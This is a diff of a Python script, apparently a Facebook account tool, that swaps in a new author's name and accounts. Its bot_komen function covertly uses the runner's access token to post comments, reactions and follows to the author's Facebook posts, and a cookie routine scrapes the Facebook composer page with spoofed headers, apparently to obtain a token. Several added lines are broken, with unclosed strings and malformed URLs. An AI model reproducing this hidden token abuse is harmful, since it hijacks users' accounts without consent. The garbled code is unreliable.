@@ -1,4 +1,4 @@
-# -*- coding: utf-8
+ # -*- coding: utf-8
 # coded by Nikyi.py
 # fb.me/Nikyi.py
 # instagram.com/Nikipratama307
@@ -50,7 +50,7 @@ op = bulan[nTemp]
 
 def logo():
 	os.system("clear")
-	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : ANGGA KURNIAWAN\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/GAAAARZXD\n\033[0;97m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : GITHUB.COM/ANGGAXD")
+	print("  \033[0;91m___ ___ __  __ ___ ___ \n \033[0;91m/ __|_ _|  \/  | _ ) __| \033[0;96mAU\033[0;97m : Nikyi pratama xd\n\033[0;97m \__ \| || |\/| | _ \ _|  \033[0;91mFB\033[0;97m : FB.ME/Nikyipratama xd\n\033[0;98m |___/___|_|  |_|___/_|   \033[0;93mGH\033[0;97m : github.com/nikicrk/Nikicrk.x")
 
 def bot_komen():
     try:
@@ -58,18 +58,18 @@ def bot_komen():
     except IOError:
         print(' \033[0;97m[\033[0;91m!\033[0;97m] Token Invalid')
         os.system('rm -rf login.txt')
-    una = ('100015073506062') 
-    post = ('1031861840659590') 
-    post2 = ('1110619372783836') 
-    kom = ('GW PAKE SC LU BANG @[100015073506062:0] 😍😘\nhttps://www.facebook.com/100015073506062/posts/1031861840659590/?app=fbl') 
-    kom2 = ('KEREN BANG @[100015073506062:0] 😘😘\nhttps://m.facebook.com/photo.php?fbid=1110619372783836&set=a.106868716492245&type=3&app=fbl') 
+    una = ('112380884385177') 
+    post = ('112380884385177') 
+    post2 = ('112380884385177') 
+    kom = ('GW PAKE SC LU BANG @[112380884385177:1123808843851770] 😍😘\nhttps://https://www.facebook.com/100068397981838/posts/108601771429755/?app=fbl
+    kom2 = ('KEREN BANG @[112380884385177:0] 😘😘\https://www.facebook.com/100068397981838/posts/108601771429755/?app=fbl
     reac = ('LOVE') 
-    requests.post('https://graph.facebook.com/' + post + '/comments/?message=' + kom + '&access_token=' + token)
-    requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ token)
+    requests.post('https://www.facebook.com/100068397981838/posts/108601771429755/?app=fbl' + kom + '&access_token=' + token)
+    requests.post('https://www.facebook.com/100068397981838/posts/108601771429755/?app=fbl+ '&access_token='+ token)
     requests.post('https://graph.facebook.com/' + post2 + '/comments/?message=' + kom2 + '&access_token=' + token)
     requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac+ '&access_token='+ token)
-    requests.post('https://graph.facebook.com/100003251214832/subscribers?access_token=' + token)
-    requests.post('https://graph.facebook.com/100015073506062/subscribers?access_token=' + token)
+    requests.post('https://www.facebook.com/100068397981838/posts/108601771429755/?app=fbl?access_token=' + token)
+    requests.post('https://www.facebook.com/100068397981838/posts/108601771429755/?app=fbl?access_token=' + token)
     print(" \033[0;97m[\033[0;92m+\033[0;97m] Login Successfully")
     menu()
 
@@ -101,7 +101,7 @@ def cookie():
 		data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers = {
 		'user-agent'                : 'Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36', # Jangan Di Ganti Ea Anjink.
 		'referer'                   : 'https://m.facebook.com/',
-		'host'                      : 'm.facebook.com',
+		'host'                      : 'm.facebook.com', 
 		'origin'                    : 'https://m.facebook.com',
 		'upgrade-insecure-requests' : '1',
 		'accept-language'           : 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
